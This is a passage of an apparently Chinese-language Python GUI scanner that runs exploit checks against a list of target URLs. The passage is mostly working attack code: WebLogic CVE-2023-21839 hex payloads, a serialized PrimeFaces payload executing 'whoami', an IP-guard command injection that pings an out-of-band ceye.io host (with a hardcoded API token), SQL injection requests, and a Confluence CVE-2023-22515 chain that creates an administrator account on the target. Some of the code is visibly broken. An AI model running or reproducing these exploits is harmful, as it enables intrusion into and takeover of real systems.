        scroll_bar.pack(side=tk.RIGHT, fill=tk.Y)
        self.output_text.configure(yscrollcommand=scroll_bar.set)

        # Configure the styles of the output text box
        self.output_text.tag_configure("red", foreground="#FF0000", font=("Helvetica", 12, "bold"))
        self.output_text.tag_configure("green", foreground="#00FF00", font=("Helvetica", 12))
        self.output_text.tag_configure("yellow", foreground="yellow", font=("Helvetica", 12))

    def create_buttons(self):
        self.button_frame = tk.Frame(self.root)
        self.button_frame.pack()

        self.detect_button = tk.Button(self.button_frame, text="检测", command=self.detect_vulnerabilities)
        self.detect_button.pack(side=tk.LEFT)

        self.stop_button = tk.Button(self.button_frame, text="停止", command=self.stop_detection)
        self.stop_button.pack(side=tk.LEFT)

    def select_file(self):
        file_path = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt")])
        self.file_entry.delete(0, tk.END)
        self.file_entry.insert(tk.END, file_path)

    def detect_vulnerabilities(self):
        file_path = self.file_entry.get().strip()
        if not file_path:
            messagebox.showerror("错误", "请输入文件路径")
            return

        with open(file_path, "r") as file:
            urls = file.read().splitlines()

        selected_vulnerabilities = []
        for index, var in enumerate(self.vars):
            if var.get() == 1:
                selected_vulnerabilities.append(self.vulnerabilities[index])

        self.output_text.config(state=tk.NORMAL)
        self.output_text.delete("1.0", tk.END)
        self.output_text.config(state=tk.DISABLED)

        self.stop_detection_flag = False

        detection_thread = threading.Thread(target=self.perform_detection, args=(urls, selected_vulnerabilities))
        detection_thread.start()

    #class POC:
    #def __init__(self, target, port, ldap):
    #    self.target = target
    #    self.port = port
    #    self.timeout = 5
    #    self.ldap = ldap

    def verify(self,ip,port,ldap):
        vp = "743320392e322e302e300a41533a3235350a484c3a39320a4d5" \
             "33a31303030303030300a50553a74333a2f2f746573743a373030310a0a"

        self.append_to_output(f"[*] ip : {ip}", "green")
        self.append_to_output(f"[*] port : {port}", "green")
        self.append_to_output(f"[*] ldap :{ldap}", "green")
        ver = self.getVer(ip, port, bytes.fromhex(vp))
        wlsKey1 = None
        wlsKey2 = None
        if ver == '12':
            wlsKey1 = "00424541080103000000000c41646d696e53657276657200000000000000003349" \
                      "444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e6743" \
                      "6f6e74657874416e793a312e3000000000000238000000000000014245412c0000001000" \
                      "00000000000000{{key1}}"
            wlsKey2 = "00424541080103000000000c41646d696e53657276657200000000000000003349" \
                      "444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e6743" \
                      "6f6e74657874416e793a312e30000000000004{{key3}}000000014245412c0000001000" \
                      "00000000000000{{key1}}"
        elif ver == '14':
            wlsKey1 = "00424541080103000000000c41646d696e53657276657200000000000000003349444c3a7765626c" \
                      "6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e67436f6e74657874416e793a31" \
                      "2e3000000000000238000000000000014245412e000000100000000000000000{{key1}}"
            wlsKey2 = "00424541080103000000000c41646d696e53657276657200000000000000003349444c3a7765626c" \
                      "6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e67436f6e74657874416e793a31" \
                      "2e30000000000004{{key3}}000000014245412e000000100000000000000000{{key1}}"
        if wlsKey1 is not None and wlsKey2 is not None:
            self.poc(self,ip, port, bytes.fromhex(wlsKey1), bytes.fromhex(wlsKey2))

    def getVer(self, target, port, payload):
        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sk.settimeout(5)
        try:
            sk.connect((target, int(port)))
            sk.sendall(payload)
            data = sk.recv(1024)
            if b"Welcome" in data:
                return '12'
            elif b"Runtime" in data:
                return '14'
            else:
                return 'unknown'
        except Exception as e:
            self.append_to_output(f"Error:{e}", "yellow")
            return 'error'
        finally:
            sk.close()

    def poc(self, target, port, wlsKey1, wlsKey2):
        self.append_to_output("[*] send malicious request...", "green")
        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sk.settimeout(5)
        try:
            sk.connect((target, int(port)))
            sk.sendall(wlsKey1)
            data = sk.recv(1024)
            if b"HTTP/1.1 200 OK" in data:
                self.append_to_output("[+] Success: key1 is valid【weblogicRCE(CVE-2023-21839)】!", "red")
            else:
                self.append_to_output("[-] key1 is invalid【weblogicRCE(CVE-2023-21839)】!", "green")
                return
            sk.sendall(wlsKey2)
            data = sk.recv(1024)
            if b"HTTP/1.1 200 OK" in data:
                self.append_to_output("[+] Success: key3 is valid【weblogicRCE(CVE-2023-21839)】!", "red")
            else:
                self.append_to_output("[-] key3 is invalid【weblogicRCE(CVE-2023-21839)】!", "green")
        except Exception as e:
            self.append_to_output("Error:", e, "yellow")
        finally:
            sk.close()

    def perform_detection(self, urls, vulnerabilities):
        if self.proxies_var.get() == 1:
            self.proxies = {
                'http': 'http://127.0.0.1:8080',
                'https': 'http://127.0.0.1:8080'
            }
        else:
            self.proxies = None

        class Colors:
            BLUE = '\033[94m'
            GREEN = '\033[32m'
            RED = '\033[0;31m'
            DEFAULT = '\033[0m'
            ORANGE = '\033[33m'
            WHITE = '\033[97m'
            BOLD = '\033[1m'
            BR_COLOUR = '\033[1;37;40m'

        headers = {
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)",
            "Accept": "*/*",
            "Connection": "close",
            "Accept-Language": "en",
            "Accept-Encoding": "gzip,deflate"
        }

        for url in urls:
            if self.stop_detection_flag:
                break

            for vulnerability in vulnerabilities:
                if vulnerability == "147.Jeecg commonController 任意文件上传漏洞":
                    Jeecg_commonController_file_upload_scan.scan_Jeecg_commonController_file_upload(url, self.proxies, headers,self.append_to_output)
                if vulnerability == "146.友点CMS image_upload.php 文件上传":
                    youdian_CMS_upload_vul_scan.scan_youdian_CMS_upload_vul(url, self.proxies, headers,self.append_to_output)
                if vulnerability == "145.致远OA ucpcLogin存在密码重置漏洞":
                    Zhiyuan_OA_pwd_reset_vul_scan.scan_Zhiyuan_OA_pwd_reset_vul(url, self.proxies,headers,self.append_to_output)
                if vulnerability == "144.ChatGPT-Next-Web XSS漏洞复现(CVE-2023-49785)":
                    ChatGPT_Next_Web_XSS_CVE_2023_49785_scan.scan_ChatGPT_Next_Web_XSS_CVE_2023_49785(url, self.proxies, headers,self.append_to_output)
                if vulnerability == "143.JeePlus快速开发平台 validateMobile SQL注入":
                    JeePlus_validateMobile_SQL_scan.scan_JeePlus_validateMobile_SQL(url, self.proxies, headers,self.append_to_output)
                if vulnerability == "142.SpringBlade errorlist SQL报错注入":
                    SpringBlade_errorlist_SQL_scan.scan_SpringBlade_errorlist_SQL(url, self.proxies, headers, self.append_to_output)
                if vulnerability == "141.帮管客 CRM jiliyu SQL注入漏洞":
                    bang_CRM_JILIYU_sql_scan.scan_bang_CRM_JILIYU_sql(url, self.proxies, headers, self.append_to_output)
                if vulnerability == "140.通天星CMSV6车载定位监控平台 SQL注入漏洞(XVE-2023-23744)":
                    XVE_2023_23744_scan.scan_XVE_2023_23744(url, self.proxies, headers, self.append_to_output)
                if vulnerability == "139.JetBrains TeamCity 身份验证绕过漏洞(CVE-2024-27198)":
                    CVE_2024_27198_scan.scan_CVE_2024_27198(url,self.proxies,headers,self.append_to_output)
                if vulnerability == "138.网康科技 NS-ASG 应用安全网关 SQL注入漏洞(CVE-2024-2022)":
                    CVE_2024_2022_scan.scan_CVE_2024_2022(url,self.proxies,headers,self.append_to_output)
                if vulnerability == "137.蓝凌EIS智慧协同平台 rpt_listreport_defi露漏洞nefield.aspx SQL注入漏洞":
                    Lanling_EIS_SQL_vul_scan.scan_Lanling_EIS_SQL_vul(url,self.proxies,headers,self.append_to_output)
                if vulnerability == "136.广联达Linkworks GetAllData 信息泄露漏洞":
                    Glodon_Linkworks_GetAllData_information_scan.scan_Glodon_Linkworks_GetAllData_information(url, self.proxies, headers,self.append_to_output)
                if vulnerability == "135.通天星CMSV6 车载视频监控平台 信息泄露漏洞":
                    Tongtianxing_CMSV6_vehicle_video_scan.scan_Tongtianxing_CMSV6_vehicle_video(url, self.proxies, headers,self.append_to_output)
                if vulnerability == "134.WordPres Bricks Builder 前台RCE漏洞(CVE-2024-25600)":
                    WordPres_Bricks_Builder_scan.scan_WordPres_Bricks_Builder(url, self.proxies,headers,self.append_to_output)
                if vulnerability == "133.友点CMS GetSpecial SQL注入漏洞":
                    Youdian_CMS_GetSpecial_SQL_vul_scan.scan_Youdian_CMS_GetSpecial_SQL_vul(url, self.proxies,headers,self.append_to_output)
                if vulnerability == "132.CERIO DT系列路由器命令执行漏洞":
                    CERIO_DT_Series_Router_Command_Vul_scan.scan_CERIO_DT_Series_Router_Command_Vul(url,self.proxies,headers,self.append_to_output)
                if vulnerability == "131.XMall开源商城SQL注入漏洞(CVE-2024-24112)":
                    XMall_Open_Marketplace_SQL_Injection_scan.scan_XMall_Open_Marketplace_SQL_Injection(url,self.proxies,headers,self.append_to_output)
                if vulnerability == "130.百卓Smart管理平台uploadfile.php文件上传漏洞(CVE-2024-0939)":
                    Byzoro_Smart_Management_upload_scan.scan_Byzoro_Smart_Management_upload(url,self.proxies,headers,self.append_to_output)
                if vulnerability == "129.大华智能物联综合管理平台 任意文件读取漏洞":
                    Dahua_QVD_2023_45063_scan.scan_Dahua_QVD_2023_45063(url,self.proxies,headers,self.append_to_output)
                if vulnerability == "128.用友移动管理系统 getApp SQL注入漏洞":
                    Yongyou_getApp_SQL_scan.scan_Yongyou_getApp_SQL(url,self.proxies,headers,self.append_to_output)
                if vulnerability == "127.Ivanti VPN RCE漏洞(CVE-2024-21887)":
                    Ivanti_VPN_RCE_scan.scan_Ivanti_VPN_RCE(url,self.proxies,headers,self.append_to_output)
                if vulnerability == "126.SpringBlade export-user SQL注入漏洞":
                    SpringBlade_Export_user_SQL_scan.scan_SpringBlade_Export_user_SQL(url,self.proxies,headers,self.append_to_output)
                if vulnerability == "125.安恒明御安全网关 aaa_local_web_preview文件上传漏洞":
                    ANHENG_Mingyu_security_gateway_file_upload_scan.scan_ANHENG_Mingyu_security_gateway_file_upload(url,self.proxies,headers,self.append_to_output)
                if vulnerability == "124.大华 DSS 数字监控系统 itcBulletin SQL 注入漏洞":
                    Dahua_DSS_system_itcBulletin_SQL_injection_scan.scan_Dahua_DSS_system_itcBulletin_SQL_injection(url, self.proxies, headers,self.append_to_output)
                if vulnerability == "123.绿盟 SAS堡垒机 local_user.php 权限绕过漏洞":
                    NSFOCUS_bastionhost_privileges_scan.scan_NSFOCUS_bastionhost_privileges(url, self.proxies, headers,self.append_to_output)
                if vulnerability == "122.宇视科技视频监控 main-cgi 文件信息泄露漏洞":
                    Uniview_video_surveillance_scan.scan_Uniview_video_surveillance(url, self.proxies, headers,self.append_to_output)
                if vulnerability == "121.多家网关-安全设备存在远程命令执行漏洞":
                    Multiple_gateway_security_devices_scan.scan_Multiple_gateway_security_devices(url, self.proxies, headers,self.append_to_output)
                if vulnerability == "120.Altenergy电力系统控制软件 RCE漏洞":
                    Altenergy_Power_System_Control_scan.scan_Altenergy_Power_System_Control(url, self.proxies, headers, self.append_to_output)
                if vulnerability == "119.海康运行管理中心 RCE漏洞":
                    Hikvision_Operation_Management_Center_scan.scan_Hikvision_Operation_Management_Center(url, self.proxies, headers, self.append_to_output)
                if vulnerability == "117.Junos webauth_operation.php 文件上传漏洞(CVE-2023-36844)":
                    Junos_webauth_operation_upload_scan.scan_Junos_webauth_operation_upload(url, self.proxies, headers,self.append_to_output)
                if vulnerability == "116.Telesquare TLR-2005Ksh 路由器 RCE漏洞":
                    Telesquare_TLR_2005Ksh_RCE_scan.scan_Telesquare_TLR_2005Ksh_RCE(url, self.proxies, headers,self.append_to_output)
                if vulnerability == "115.NUUO摄像头远程命令执行漏洞":
                    NUUO_camera_command_scan.scan_NUUO_camera_command(url, self.proxies, headers,self.append_to_output)
                if vulnerability == "114.Toseiweb管理端network_test.php参数远程命令执行漏洞":
                    Toseiweb_network_test_Command_scan.scan_Toseiweb_network_test_Command(url, self.proxies, headers,self.append_to_output)
                if vulnerability == "113.likeshop单商户商城系统任意文件上传漏洞":
                    Likeshop_File_upload_vuln_scan.scan_Likeshop_File_upload_vuln(url, self.proxies, headers,self.append_to_output)
                if vulnerability == "112.HWL-2511-SSpopen.cgi命令执行漏洞":
                    HWL_2511_SSpopencgi_Command_scan.scan_HWL_2511_SSpopencgi_Command(url, self.proxies, headers, self.append_to_output)
                if vulnerability == "111.思福迪 运维安全管理系统 test_qrcode_b 远程命令执行漏洞":
                    SFDI_Security_Management_System_test_qrcode_b_Command_Vuln_Scan.Scan_SFDI_Security_Management_System_test_qrcode_b_Command_Vuln(url, self.proxies, headers, self.append_to_output)
                if vulnerability == "110.Telesquare TLR-2005Ksh 路由器 getUsernamePassword 信息泄露":
                    Telesquare_TLR_2005Ksh_scan.scan_Telesquare_TLR_2005Ksh(url, self.proxies, headers, self.append_to_output)
                if vulnerability == "109.优卡特脸爱云一脸通智慧管理平台权限绕过漏洞(CVE-2023-6099)":
                    yikatong_ailianyun_scan.scan_yikatong_ailianyun(url, self.proxies, headers, self.append_to_output)
                if vulnerability == "108.XETUX软件dynamiccontent.properties.xhtml远程代码执行漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.667.76 Safari/537.36",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept": "*/*",
                        "Connection": "close",
                        "Content-Type": "application/x-www-form-urlencoded",
                    }
                    if url.endswith("/"):
                        path = "xc-one-pos/javax.faces.resource/dynamiccontent.properties.xhtml"
                    else:
                        path = "/xc-one-pos/javax.faces.resource/dynamiccontent.properties.xhtml"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    data = '''pfdrt=sc&ln=primefaces&pfdrid=4xE5s8AClZxUxmyaZjpBstMXUalIgOJHOtvxel%2Fv4YXvibdOn52ow4M6lDaKd9Gb8JdQqbACZNWVZpVS%2B3sX1Hoizouty1mYYT4yJsKPnUZ0LUHDvN0GB5YLgX1PkNY%2B1ZQ%2FnOSg5J1LDyzAjBheAxLDODIVcHkmJ6hnJsQ0YQ8bMU5%2B%2BTqeD4BGqCZMDjP%2BZQvveiUhxsUC%2F%2BtPqnOgFSBV8TBjDSPNmVoQ9YcKTGelKuJjS2kCXHjcyz7PcQksSW6UUmKu9RhJ%2Bx3Mnx6j56eroVPWnM2vdYRt5An6cLo1YPXu9uqriyg1wgm%2F7xYP%2FUwP1q8wfVeyM4fOw2xJzP6i1q4VLHLXi0VYHAIgaPrZ8gH8XH4X2Kq6ewyrJ62QxBF5dtE3tvLAL5tpGxqek5VW%2BhZFe9ePu0n5tLxWmqgqni8bKGbGrGu4IhXhCJhBxyelLQzPGLCfqmiQwYX5Ime9EHj1k5eoWQzH8jb3kQfFJ0exVprGCfXKGfHyfKfLEOd86anNsiQeNavNL7cDKV0yMbz52n6WLQrCAyzulE8kBCZPNGIUJh24npbeaHTaCjHRDtI7aIPHAIhuMWn7Ef5TU9DcXjdJvZqrItJoCDrtxMFfDhb0hpNQ2ise%2BbYIYzUDkUtdRV%2BjCGNI9kbPG5QPhAqp%2FJBhQ%2BXsqIhsu4LfkGbt51STsbVQZvoNaNyukOBL5IDTfNY6wS5bPSOKGuFjsQq0Xoadx1t3fc1YA9pm%2FEWgyR5DdKtmmxG93QqNhZf2RlPRJ5Z3jQAtdxw%2BxBgj6mLY2bEJUZn4R75UWnvLO6JM918jHdfPZELAxOCrzk5MNuoNxsWreDM7e2GX2iTUpfzNILoGaBY5wDnRw46ATxhx6Q%2FEba5MU7vNX1VtGFfHd2cDM5cpSGOlmOMl8qzxYk1R%2BA2eBUMEl8tFa55uwr19mW9VvWatD8orEb1RmByeIFyUeq6xLszczsB5Sy85Y1KPNvjmbTKu0LryGUc3U8VQ7AudToBsIo9ofMUJAwELNASNfLV0fZvUWi0GjoonpBq5jqSrRHuERB1%2BDW2kR6XmnuDdZMt9xdd1BGi1AM3As0KwSetNq6Ezm2fnjpW877buqsB%2BczxMtn6Yt6l88NRYaMHrwuY7s4IMNEBEazc0IBUNF30PH%2B3eIqRZdkimo980HBzVW4SXHnCMST65%2FTaIcy6%2FOXQqNjpMh7DDEQIvDjnMYMyBILCOCSDS4T3JQzgc%2BVhgT97imje%2FKWibF70yMQesNzOCEkaZbKoHz498sqKIDRIHiVEhTZlwdP29sUwt1uqNEV%2F35yQ%2BO8DLt0b%2BjqBECHJzI1IhGvSUWJW37TAgUEnJWpjI9R1hT88614GsVDG0UYv0u8YyS0chh0RryV3BXotoSkSkVGShIT4h0s51Qjswp0luewLtNuVyC5FvHvWiHLzbAArNnmM7k%2FGdCn3jLe9PeJp7yqDzzBBMN9kymtJdlm7c5XnlOv%2BP7wIJbP0i4%2BQF%2BPXw5ePKwSwQ9v8rTQ%3D%3D&cmd=whoami'''
                    encodetext = url + path
                    self.append_to_output("===================================================================","green")
                    try:
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req1 = requests.post(encodetext, data=data, headers=headers, verify=False, timeout=20, proxies=proxies)

                        if req1.status_code == 200 and 'system' in req1.text:
                            self.append_to_output(f"[+] {url} 存在XETUX软件dynamiccontent.properties.xhtml远程代码执行漏洞！！！！", "red")
                        else:
                            self.append_to_output(f"[-] {url} 不存在XETUX软件dynamiccontent.properties.xhtml远程代码执行漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                            self.append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
                        else:
                            self.append_to_output(str(e), "yellow")
                if vulnerability == "107.IP-guard Webserver view 远程命令执行漏洞":
                    # 替换成您的CEYE API信息
                    api_base_url = "http://api.ceye.io/v1"
                    api_token = "394eb5e86394352a6270dc6a60dc7848"
                    payload_id = "0uim95.ceye.io"

                    # 构建API请求的参数
                    params = {
                        "token": api_token,
                        "type": "dns",
                        "filter": payload_id
                    }

                    # 构建API请求的URL
                    request_url = f"{api_base_url}/records"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    if url.endswith("/"):
                        path = f"ipg/static/appr/lib/flexpaper/php/view.php?doc=11.jpg&format=swf&isSplit=true&page=||ping%20{payload_id}"
                    else:
                        path = f"/ipg/static/appr/lib/flexpaper/php/view.php?doc=11.jpg&format=swf&isSplit=true&page=||ping%20{payload_id}"
                    encodetext = url + path


                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0",
                        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                        "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                        "Accept-Encoding": "gzip, deflate, br",
                    }
                    self.append_to_output("===================================================================","green")
                    try:
                        response_ceye = requests.get(request_url, params=params, verify=False, proxies=None)
                        if response_ceye.status_code == 200:
                            data = response_ceye.json()
                            records = data.get("data", [])
                            id_count = len(records)

                            if id_count > 0:
                                self.append_to_output(f"[-] CEYE收到请求记录，共收到 {id_count} 个id属性记录。", "yellow")
                                self.append_to_output("[!] 请求记录列表：", "yellow")
                                for record in records:
                                    self.append_to_output(str(record), "yellow")
                            else:
                                self.append_to_output("[-] CEYE没有收到请求记录。", "yellow")

                        else:
                            self.append_to_output("[-] API请求失败。HTTP状态码：", response_ceye.status_code)

                        start_time = time.time()
                        response = requests.get(encodetext, headers=headers, verify=False, timeout=10, proxies=proxies)
                        end_time = time.time()
                        response_time = end_time - start_time
                        res =response.text
                        if res.status_code==200 and response_time >2 and response_time<6:
                            self.append_to_output(Fore.GREEN + f"[+] {url} 可能存在IP-guard Webserver view 远程命令执行漏洞，等待ceyelog日志确认！！！！", "red")
                            self.append_to_output(res, "yellow")

                            response_ceye = requests.get(request_url, params=params, verify=False, timeout=10, proxies=proxies)
                            if response_ceye.status_code == 200:
                                data = response_ceye.json()
                                records = data.get("data", [])
                                id_count_change = len(records)

                                if id_count_change > id_count:
                                    self.append_to_output(f"[!] CEYE收到请求记录，共收到 {id_count_change} 个id属性记录。99%确认存在漏洞", "red")
                                    self.append_to_output("请求记录列表：", "yellow")
                                    for record in records:
                                        self.append_to_output(str(record), "yellow")
                                else:
                                    self.append_to_output(f"[-] CEYE没有收到请求记录，误报。", "green")

                            else:
                                self.append_to_output(f"[-] API请求失败。HTTP状态码：{response_ceye.status_code}", "green")
                        elif res.status_code==200:
                            response_ceye = requests.get(request_url, params=params, verify=False, timeout=10,proxies=None)
                            if response_ceye.status_code == 200:
                                data = response_ceye.json()
                                records = data.get("data", [])
                                id_count_change = len(records)

                                if id_count_change > id_count:
                                    self.append_to_output(f"[!] CEYE收到请求记录，共收到 {id_count_change} 个id属性记录。99%确认存在漏洞",
                                                          "red")
                                    self.append_to_output("请求记录列表：", "yellow")
                                    for record in records:
                                        self.append_to_output(str(record), "yellow")
                                else:
                                    self.append_to_output(f"[-] CEYE没有收到请求记录，误报。", "green")

                            else:
                                self.append_to_output(f"[-] API请求失败。HTTP状态码：{response_ceye.status_code}", "green")
                        else:
                            self.append_to_output(Fore.RED + f"[-] {url} 不存在IP-guard Webserver view 远程命令执行漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，但是检测一下ceye是否有变化: {url}", "yellow")
                        response_ceye = requests.get(request_url, params=params, verify=False, timeout=10, proxies=None)
                        if response_ceye.status_code == 200:
                            data = response_ceye.json()
                            records = data.get("data", [])
                            id_count_change = len(records)

                            if id_count_change > id_count:
                                self.append_to_output(f"[!] CEYE收到请求记录，共收到 {id_count_change} 个id属性记录。99%确认存在漏洞", "red")
                                self.append_to_output("[-] 请求记录列表：", "yellow")
                                for record in records:
                                    self.append_to_output(str(record), "yellow")
                                self.append_to_output(f"[+] 确认 {url} 存在IP-guard Webserver view 远程命令执行漏洞", "red")
                            else:
                                self.append_to_output("[-] CEYE没有收到请求记录，跳过这个URL。", "green")

                        else:
                            self.append_to_output(f"[-] API请求失败。HTTP状态码：{response_ceye.status_code}", "green")
                    except Exception as e:
                        self.append_to_output(str(e))
                if vulnerability == "106.泛微e-Weaver SQL注入":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.667.76 Safari/537.36",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept": "*/*",
                        "Connection": "close",
                        "Content-Type": "application/json",
                    }
                    if url.endswith("/"):
                        path = "Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version"
                    else:
                        path = "/Api/portal/elementEcodeAddon/getSqlData?sql=select%20@@version"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path
                    self.append_to_output("===================================================================","green")
                    try:
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req1 = requests.get(encodetext, headers=headers, verify=False, timeout=20, proxies=proxies)

                        if req1.status_code == 200 and 'api_status' in req1.text and 'data' in req1.text:
                            self.append_to_output(f"[+] {url} 存在泛微e-Weaver SQL注入！！！！", "red")
                        else:
                            self.append_to_output(f"[-] {url} 不存在泛微e-Weaver SQL注入", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                            self.append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
                        else:
                            self.append_to_output(str(e), "yellow")
                if vulnerability == "105.奇安信360天擎getsimilarlist存在SQL注入漏洞":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.667.76 Safari/537.36",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept": "*/*",
                        "Connection": "close",
                        "Content-Type": "application/json",
                    }
                    if url.endswith("/"):
                        path = "api/client/getsimilarlist?status[0,1%29+union+all+select+%28%2F%2A%2150000select%2A%2F+79787337%29%2C+setting%2C+setting%2C+status%2C+name%2C+create_time+from+\"user\"+where+1+in+%281]=1&status[0]=1"
                    else:
                        path = "/api/client/getsimilarlist?status[0,1%29+union+all+select+%28%2F%2A%2150000select%2A%2F+79787337%29%2C+setting%2C+setting%2C+status%2C+name%2C+create_time+from+\"user\"+where+1+in+%281]=1&status[0]=1"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path
                    self.append_to_output("===================================================================","green")
                    try:
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req1 = requests.get(encodetext, headers=headers, verify=False, timeout=20, proxies=proxies)

                        if req1.status_code == 200 and 'list' in req1.text and 'total' in req1.text:
                            self.append_to_output(f"[+] {url} 存在奇安信360天擎getsimilarlist存在SQL注入漏洞！！！！", "red")
                        else:
                            self.append_to_output(f"[-] {url} 不存在奇安信360天擎getsimilarlist存在SQL注入漏洞", "green")
                    except Timeout:
                        self.append_to_output(f"[!] 请求超时，跳过URL: {url}", "yellow")
                    except Exception as e:
                        if 'HTTPSConnectionPool' in str(e) or 'Burp Suite Professional' in str(e):
                            self.append_to_output(f"[-] {url} 证书校验错误或者证书被拒绝", "yellow")
                        else:
                            self.append_to_output(str(e), "yellow")
                if vulnerability == "104.Confluence未授权管理用户添加 (CVE-2023-22515)":
                    proxies = {
                        'http': 'http://127.0.0.1:8080',
                        'https': 'http://127.0.0.1:8080'
                    }
                    headers = {
                        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.667.76 Safari/537.36",
                        "Accept-Encoding": "gzip, deflate",
                        "Accept": "*/*",
                        "Connection": "close",
                        "Content-Type": "application/json",
                    }
                    if url.endswith("/"):
                        path = "setup/setupadministrator-start.action"
                    else:
                        path = "/setup/setupadministrator-start.action"

                    if not url.startswith('http://') and not url.startswith('https://'):
                        url = 'http://' + url

                    encodetext = url + path
                    self.append_to_output("===================================================================","green")
                    try:
                        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                        req1 = requests.get(encodetext, headers=headers, verify=False, timeout=20, proxies=proxies)

                        if req1.status_code == 200 and 'Setup is already complete' in req1.text:
                            self.append_to_output(f"[+] 第一阶段已按照指定方式回显，准备进一步判断是否存在漏洞！！！！", "yellow")

                            # 生成随机字符串
                            def generate_random_string(length):
                                return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

                            if url.endswith("/"):
                                path = f"server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=0&cache{generate_random_string(27)}"
                            else:
                                path = f"/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=0&cache{generate_random_string(27)}"

                            if not url.startswith('http://') and not url.startswith('https://'):
                                url_new = 'http://' + url
                            else:
                                url_new = url

                            encodetext = url_new + path
                            requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                            req2 = requests.get(encodetext, headers=headers, verify=False, timeout=20, proxies=proxies)

                            if req2.status_code == 200 :
                                self.append_to_output(f"[+] 第二阶段已按照指定方式回显，准备进一步判断是否存在漏洞！！！！", "yellow")
                                if url.endswith("/"):
                                    path = "setup/setupadministrator-start.action"
                                else:
                                    path = "/setup/setupadministrator-start.action"

                                if not url.startswith('http://') and not url.startswith('https://'):
                                    url_new = 'http://' + url
                                else:
                                    url_new = url

                                encodetext = url_new + path
                                requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                                req3 = requests.get(encodetext, headers=headers, verify=False, timeout=20,proxies=proxies)

                                if req3.status_code == 200 and 'Please configure the system administrator account for this Confluence installation' in req3.text:
                                    self.append_to_output(f"[+] 第三阶段已按照指定方式回显，准备进一步判断是否存在漏洞！！！！", "yellow")
                                    if url.endswith("/"):
                                        path = "setup/setupadministrator.action"
                                    else:
                                        path = "/setup/setupadministrator.action"

                                    if not url.startswith('http://') and not url.startswith('https://'):
                                        url_new = 'http://' + url
                                    else:
                                        url_new = url
                                    # 生成随机用户名和密码
                                    username = generate_random_string(10)
                                    password = generate_random_string(10)

                                    encodetextsi = url_new + path
                                    headers1 = {
                                        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.667.76 Safari/537.36",
                                        "Connection": "close",
                                        "Content-Type": "application/x-www-form-urlencoded",
                                        "Cookie": "JSESSIONID=1A19A70081180EA39CD40D84AB9DDFF7",
                                        "X-Atlassian-Token": "no-check",
                                        "Accept-Encoding": "gzip, deflate"
                                    }

                                    dataone = f'''username={username}&fullName=admin&email={username}@{password}.com&password={password}&confirm={password}&setup-next-button=Next'''
                                    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
                                    req4 = requests.post(encodetextsi, data=dataone, headers=headers1, verify=False,timeout=20, proxies=proxies)

                                    if req4.status_code == 200 :
                                        self.append_to_output(f"[+] 第四阶段已按照指定方式回显，准备进一步判断是否存在漏洞！！！！", "yellow")
                                        if url.endswith("/"):
                                            path = "dologin.action"
                                        else:
                                            path = "/dologin.action"

                                        if not url.startswith('http://') and not url.startswith('https://'):
                                            url_new = 'http://' + url
                                        else:
